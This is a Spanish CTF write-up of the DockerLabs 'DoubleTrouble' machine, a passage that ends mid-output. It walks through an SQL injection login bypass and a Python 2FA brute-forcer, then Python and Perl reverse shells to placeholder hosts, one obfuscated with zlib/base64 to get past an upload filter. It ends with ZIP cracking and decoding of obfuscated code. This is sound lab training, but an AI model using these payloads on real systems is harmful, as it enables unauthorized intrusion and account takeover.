---
icon: flag
---

# DoubleTrouble DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip doubletrouble.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh doubletrouble.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 11:42 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

Si entramos en la pagina vemos un panel de login, en el que si intentamos un `SQL Injection` se lo tragara y nos mostrara la opcion de cuando nos hemos logeado:

<figure><img src="../../.gitbook/assets/image (166) (1).png" alt=""><figcaption></figcaption></figure>

En esta veremos lo que parece ser un `2FA` por lo que vamos a realizar fuerza bruta con un script que nos montaremos en `python3` (hay que tener en cuenta que cuando se alcanza 3 intentos te lleva al login, por lo que tambien hay que controlar eso en el script):

> 2faBrute.py

```python
import requests
import sys

# Configuración inicial
URL_LOGIN = "http://172.17.0.2/index.php"
URL_2FA = "http://172.17.0.2/2fa.php"
USUARIO = "admin' or 1=1-- -"
CONTRASEÑA = "admin' or 1=1-- -"
MAX_INTENTOS = 3  # Número máximo de intentos antes de reintentar autenticación inicial

# Crear una sesión para mantener cookies
sesion = requests.Session()

def iniciar_sesion():
    """
    Realiza la autenticación inicial y devuelve True si es exitosa.
    """
    datos_login = {
        "username": USUARIO,
        "password": CONTRASEÑA
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    }

    print("[*] Intentando autenticación inicial...")
    respuesta = sesion.post(URL_LOGIN, data=datos_login, headers=headers)

    if respuesta.status_code == 200 and "Verificación de 2FA" in respuesta.text:
        print("[+] Autenticación inicial completada con éxito.")
        return True
    else:
        print("[-] Error en la autenticación inicial.")
        return False

def probar_2fa(codigo):
    """
    Envía un código 2FA y verifica si es correcto.
    """
    datos_2fa = {
        "code": codigo
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    }

    respuesta = sesion.post(URL_2FA, data=datos_2fa, headers=headers)

    if respuesta.status_code == 200:
        if "Código incorrecto" in respuesta.text:
            return False
        else:
            print(f"[+] ¡Código correcto encontrado!: {codigo}")
            return True
    return False

def fuerza_bruta_2fa(diccionario):
    """
    Realiza la fuerza bruta utilizando códigos de un diccionario.
    """
    intentos = 0

    for codigo in diccionario:
        codigo = codigo.strip()  # Eliminar espacios en blanco o saltos de línea
        print(f"[*] Probando código: {codigo}")

        # Intentar autenticación 2FA
        if probar_2fa(codigo):
            print("[+] Fuerza bruta exitosa.")
            return  # Salir si encontramos el código correcto

        intentos += 1

        # Reautenticación si se alcanza el límite de intentos
        if intentos >= MAX_INTENTOS:
            print(f"[!] Se alcanzó el límite de intentos ({MAX_INTENTOS}). Reautenticando...")
            if not iniciar_sesion():
                print("[-] No se pudo reautenticar. Deteniendo el proceso.")
                return
            intentos = 0

    print("[-] Fuerza bruta completada. No se encontró un código válido.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 script.py <archivo_diccionario>")
        sys.exit(1)

    archivo_diccionario = sys.argv[1]

    # Leer los códigos del archivo de diccionario
    try:
        with open(archivo_diccionario, "r") as f:
            codigos_diccionario = f.readlines()
    except FileNotFoundError:
        print(f"Error: No se encontró el archivo '{archivo_diccionario}'")
        sys.exit(1)

    # Iniciar fuerza bruta
    if iniciar_sesion():
        fuerza_bruta_2fa(codigos_diccionario)
```

> generate2fadic.py

```python
#!/bin/python3

# Archivo de salida
output_file = "diccionario.txt"

# Abrir el archivo en modo escritura
with open(output_file, "w") as file:
    # Generar todas las combinaciones de 4 dígitos
    for i in range(10000):  # Desde 0 hasta 9999
        # Formatear el número como cadena de 4 dígitos (ejemplo: 0001, 0123)
        code = f"{i:04}"
        # Escribir la combinación en el archivo
        file.write(code + "\n")

print(f"Diccionario generado exitosamente en {output_file}")
```

Primero vamos a ejecutar el `generate2fadic.py` para que nos genere el diccionario de nuemro:

```shell
python3 generate2fadic.py
```

Info:

```
Diccionario generado exitosamente en diccionario.txt
```

Y una vez echo esto, ejecutaremos el siguiente script de la siguiente forma:

```shell
python3 2faBrute.py diccionario.txt
```

Info:

```
..............................
[*] Probando código: 0144
[*] Probando código: 0145
[*] Probando código: 0146
[!] Se alcanzó el límite de intentos (3). Reautenticando...
[*] Intentando autenticación inicial...
[+] Autenticación inicial completada con éxito.
[*] Probando código: 0147
[*] Probando código: 0148
[*] Probando código: 0149
[!] Se alcanzó el límite de intentos (3). Reautenticando...
[*] Intentando autenticación inicial...
[+] Autenticación inicial completada con éxito.
[*] Probando código: 0150
[+] ¡Código correcto encontrado!: 0150
[+] Fuerza bruta exitosa.
```

Vemos que el numero es el `0150` por lo que si lo ingresamos, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (165) (1).png" alt=""><figcaption></figcaption></figure>

## Escalate user www-data

Vamos a probar a subir un archivo con una `reverse shell`, pero vemos que solo nos deja los archivos `.py` por lo que haremos lo siguiente.

> shell.py

```python
import subprocess
comando = "/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"
subprocess.run(comando, shell=True)
```

Si subimos este archivo veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/image (167) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a ofuscarlo un poco mas con la siguiente pagina:

URL = [Ofuscador de codigo Python3](https://freecodingtools.org/tools/obfuscator/python)

Y se veria de la siguiente forma:

```python
# Python obfuscation by freecodingtools.org
                    
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
```

Antes de subirlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si subimos el archivo y carga la pagina, cuando volvamos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 44498
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@8a98f880c087:/$
```

### Sanitización de shell (TTY)

```shell
export TERM=xterm
export TERM=xtermexport TERM=xtermexport TERM=xterm
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user maci

Si vemos que archivos ha creado el usuario `maci`:

```shell
find / -type f -user maci 2>/dev/null
```

Info:

```
/var/backups/.maci/.-/-/archivo500.zip
```

Vemos que es un `.zip` pero tiene toda la pinta de que hay `500` ZIPs comprimidos, por lo que tendremos que crear un script para descomprimir todos a la vez, pero que se quede en el ultimo ZIP, por lo que cuando el script detecte que esta en el `archivo0.zip` que pare:

> unzip.sh

```bash
#!/bin/bash

# Archivo ZIP principal que contiene otros archivos ZIP
ZIP_PRINCIPAL="archivo500.zip"

# Directorio donde se extraerán los archivos
DIRECTORIO_EXTRAER="extraido"

# Crear el directorio de extracción si no existe
mkdir -p "$DIRECTORIO_EXTRAER"

# Descomprimir el archivo principal
echo "Descomprimiendo el archivo principal: $ZIP_PRINCIPAL"
unzip -q "$ZIP_PRINCIPAL" -d "$DIRECTORIO_EXTRAER"

# Comenzar el bucle desde 500 hasta 1
for i in $(seq 500 -1 1)
do
  # Si el número es mayor que 9 y menor que 100, es decir, de 10 a 99, usamos el formato normal
  ZIP_FILE="$DIRECTORIO_EXTRAER/archivo$i.zip"

  # Verificar si el archivo existe
  if [ -f "$ZIP_FILE" ]; then
    # Mostrar cuál archivo ZIP estamos descomprimiendo
    echo "Descomprimiendo $ZIP_FILE..."
    
    # Descomprimir el archivo ZIP
    unzip -q "$ZIP_FILE" -d "$DIRECTORIO_EXTRAER"

    # Eliminar el archivo ZIP después de descomprimirlo (si lo deseas)
    rm -f "$ZIP_FILE"
  else
    echo "No se encontró $ZIP_FILE. Saltando..."
  fi
done

echo "Proceso completado."
```

Pero antes de ejecutarlo nos pasaremos el archivo a nuestro `host`:

```shell
cd /var/backups/.maci/.-/-/
python3 -m http.server
```

Y en nuestro `host` haremos lo siguiente:

```shell
wget http://<IP>:8000/archivo500.zip
```

Ahora si ejecutaremos el script en nuestro `host`.

```shell
bash unzip.sh
```

Info:

```
Descomprimiendo extraido/archivo13.zip...
Descomprimiendo extraido/archivo12.zip...
Descomprimiendo extraido/archivo11.zip...
Descomprimiendo extraido/archivo10.zip...
Descomprimiendo extraido/archivo9.zip...
Descomprimiendo extraido/archivo8.zip...
Descomprimiendo extraido/archivo7.zip...
Descomprimiendo extraido/archivo6.zip...
Descomprimiendo extraido/archivo5.zip...
Descomprimiendo extraido/archivo4.zip...
Descomprimiendo extraido/archivo3.zip...
Descomprimiendo extraido/archivo2.zip...
Descomprimiendo extraido/archivo1.zip...
Proceso completado.
```

Vemos que nos pide una contraseña en el `archivo0.zip` por lo que vamos a intenta `crackearlo` de la siguiente forma:

```shell
zip2john archivo0.zip > hash
```

```shell
cat hash
```

Info:

```
archivo0.zip/pass.txt:$pkzip$1*2*2*0*1a*e*44f50e5*0*42*0*1a*9660*6db7063a9a0fbd1bd13261cc80014b9a7a4cf71c254a14cf0d16*$/pkzip$:pass.txt:archivo0.zip::archivo0.zip
```

Ahora vamos a `crackeral`:

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
12345678         (archivo0.zip/pass.txt)     
1g 0:00:00:00 DONE (2025-01-16 13:03) 9.090g/s 74472p/s 74472c/s 74472C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que la contraseña del `ZIP` es `12345678` por lo que haremos lo siguiente:

```shell
unzip archivo0.zip
```

Metemos como contraseña `12345678` y veremos que se descomprimio bien, viendo lo siguiente:

Info:

```
Archive:  archivo0.zip
[archivo0.zip] pass.txt password: 
 extracting: pass.txt
```

```shell
cat pass.txt
```

Info:

```
maci:49392923
```

Por lo que vemos obtenemos las credenciales del usuario `maci`, por lo que nos cambiaremos a dicho ususario.

En la maquina victima pondremos lo siguiente:

```shell
su maci
```

Metemos como contraseña `49392923` y veremos que somos dicho usuario.

## Escalate user darksblack

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for maci on b4145e7ece7c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on b4145e7ece7c:
    (darksblack) NOPASSWD: /usr/bin/irssi
```

Vemos que podemos ejecutar el binario `irssi` como el usuario `darksblack`, por lo que vamos a buscar informacion sobre dicho binario.

En la siguiente pagina vemos informacion bastante importante, se explica que se puede ejecutar un script con `/run` cuando se ejecuta el binario y que solo utiliza lenguaje de programacion en `Perl`:

URL = [Info irssi](https://scripts.irssi.org/)

Vamos a crear el siguiente script en `perl` para crearnos una `reverse shell`:

```perl
#!/usr/bin/perl
use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};
```

Le ponemos permisos de ejecuccion:

```shell
chmod +x /tmp/shell.pl
```

Y en nuestro `host` nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ahora en la maquina victima haremos lo siguiente:

```shell
sudo -u darksblack /usr/bin/irssi
/run /tmp/shell.pl
```

Info:

```
19:06 -!-  ___           _
19:06 -!- |_ _|_ _ _____(_)
19:06 -!-  | || '_(_-<_-< |
19:06 -!- |___|_| /__/__/_|
19:06 -!- Irssi v1.4.3 - https://irssi.org
19:06 -!- Irssi: The following settings were initialized
19:06                        real_name 



 [19:06] [] [1]                                                                                                                                              
[(status)] /run /tmp/shell1.pl
```

Ahora si nos vamos a donde teniamos la escucha, veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 35466
darksblack@b4145e7ece7c:/tmp$ whoami
whoami
darksblack
```

Veremos que somos dicho usuario.

## Escalate user juan

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for darksblack on b4145e7ece7c:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User darksblack may run the following commands on b4145e7ece7c:
    (juan) NOPASSWD: /usr/bin/python3 /home/juan/shell.py
    (juan) NOPASSWD: /bin/cat /home/juan/shell.py
```

Vemos que podemos ejecutar los siguientes comandos como el usuario `juan` por lo que primero ejecutaremos el `cat` para visualizar el script y ver que hace:

```shell
sudo -u juan /bin/cat /home/juan/shell.py
```

Info:

```
exec("".join([chr(105), chr(109), chr(112), chr(111), chr(114), chr(116), chr(32), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(59), chr(32), chr(101), chr(120), chr(101), chr(99), chr(40), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(46), chr(98), chr(54), chr(52), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101), chr(40), chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(46), chr(98), chr(51), chr(50), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101), chr(40), chr(39), chr(77), chr(70), chr(76), chr(84), chr(67), chr(53), chr(51), chr(67), chr(71), chr(78), chr(70), chr(68), chr(65), chr(83), chr(75), chr(73), chr(74), chr(89), chr(50), chr(87), chr(71), chr(53), chr(51), chr(81), chr(79), chr(66), chr(82), chr(70), chr(81), chr(81), chr(84), chr(87), chr(77), chr(78), chr(88), chr(70), chr(67), chr(90), chr(51), chr(67), chr(71), chr(78), chr(71), chr(85), chr(87), chr(89), chr(75), chr(88), chr(71), chr(70), chr(51), chr(87), chr(69), chr(77), chr(50), chr(75), chr(71), chr(66), chr(69), chr(85), chr(81), chr(84), chr(82), chr(82), chr(76), chr(70), chr(88), chr(69), chr(69), chr(54), chr(76), chr(67), chr(71), chr(74), chr(72), chr(71), chr(89), chr(89), chr(90), chr(84), chr(74), chr(86), chr(70), chr(87), chr(67), chr(86), chr(90), chr(82), chr(79), chr(53), chr(82), chr(68), chr(71), chr(83), chr(82), chr(81), chr(74), chr(70), chr(69), chr(69), chr(52), chr(53), chr(83), chr(90), chr(71), chr(74), chr(50), chr(71), chr(89), chr(90), chr(67), chr(66), chr(79), chr(66), chr(89), chr(71), chr(69), chr(87), chr(67), chr(67), chr(79), chr(89), chr(70), chr(71), chr(71), chr(51), chr(83), chr(82), chr(77), chr(53), chr(83), chr(69), chr(79), chr(51), chr(68), chr(85), chr(76), chr(74), chr(73), chr(87), chr(54), chr(83), chr(50), chr(84), chr(73), chr(85), chr(52), chr(86), chr(73), chr(86), chr(83), chr(68), chr(73), chr(69), chr(52), chr(85), chr(83), chr(81), chr(50), chr(74), chr(80), chr(66),............................
```

Vemos que hay muchos numeros, pero que parece tener un patron `ascii` por lo que vamos a crear un script para eliminar todo lo que no sea numeros y dejarlo limpio con solo numeros.

> clearAscii.sh

```bash
#!/bin/bash

# Verifica si se pasa un archivo como argumento
if [ -z "$1" ]; then
    echo "Por favor, pasa el archivo .py como argumento."
    exit 1
fi

# Extrae los números del archivo .py y los guarda en numeros.txt
grep -o '[0-9]\+' "$1" | tr '\n' ' ' > numeros.txt

echo "Los números se han guardado en numeros.txt."
```

Vamos a ejecutarlo de la siguiente forma (Hay que copiar el contenido del `shell.py` y pasarnoslo a nuestro `host` para realizar todo esto):

```shell
bash clearAscii.sh shell.py
```

Info:

```
Los números se han guardado en numeros.txt.
```

Ahora leemos los numeros...

```shell
cat numeros.txt
```

Info:

```
105 109 112 111 114 116 32 98 97 115 101 54 52 59 32 101 120 101 99 40 98 97 115 101 54 52 46 98 54 52 100 101 99 111 100 101 40 98 97 115 101 54 52 46 98 51 50 100 101 99 111 100 101 40 39 77 70 76 84 67 53 51 67 71 78 70 68 65 83 75 73 74 89 50 87 71 53 51 81 79 66 82 70 81 81 84 87 77 78 88 70 67 90 51 67 71 78 71 85 87 89 75 88 71 70 51 87 69 77 50 75 71 66 69 85 81 84 82 82 76 70 88 69 69 54 76 67 71 74 72 71 89 89 90 84 74 86 70 87 67 86 90 82 79 53 82 68 71 83 82 81 74 70 69 69 52 53 83 90 71 74 50 71 89 90 67 66 79 66 89 71 69 87 67 67 79 89 70 71 71 51 83 82 77 53 83 69 79 51 68 85 76 74 73 87 54 83 50 84 73 85 52 86 73 86 83 68 73 69 52 85 83 81 50 74 80 66 72 72 85 83 76 86 74 86 75 71 71 53 75 78 73 77 50 72 81 84 50 69 74 86 85 85 71 51 67 67 75 66 75 87 89 85 76 72 75 66 74 85 67 77 75 78 73 82 65 88 83 81 51 72 79 66 86 86 85 86 50 90 77 53 77 84 69 79 76 86 77 74 87 86 77 50 84 69 73 78 85 71 54 67 84 67 71 78 72 68 65 84 67 68 73 74 51 87 69 77 50 75 71 66 70 86 73 51 50 76 74 70 66 85 67 90 50 74 74 66 71 87 79 85 67 84 73 74 53 71 69 77 83 79 79 74 78 70 81 85 76 86 77 77 90 68 83 50 84 66 71 74 76 68 65 83 50 73 74 90 51 70 83 77 84 85 78 82 83 69 71 78 75 67 75 74 87 68 83 83 83 85 78 78 76 70 75 84 67 68 73 74 53 71 69 77 83 79 79 74 78 70 81 85 76 86 66 74 75 84 65 79 75 69 75 77 89 84 83 86 67 87 73 90 70 69 77 85 75 86 71 66 89 69 71 50 75 66 77 53 69 85 71 81 84 50 74 82 87 85 52 53 84 67 78 85 50 87 89 87 74 84 75 70 88 85 87 82 51 73 79 90 82 84 71 85 76 84 74 70 69 69 69 53 84 68 78 90 73 88 65 83 50 82 78 53 84 85 83 81 50 66 77 53 82 87 50 86 82 81 77 82 77 69 85 53 75 74 74 66 71 85 87 81 51 78 75 74 87 65 85 87 84 74 73 73 90 86 83 86 51 77 71 66 77 68 69 87 84 87 77 78 87 68 83 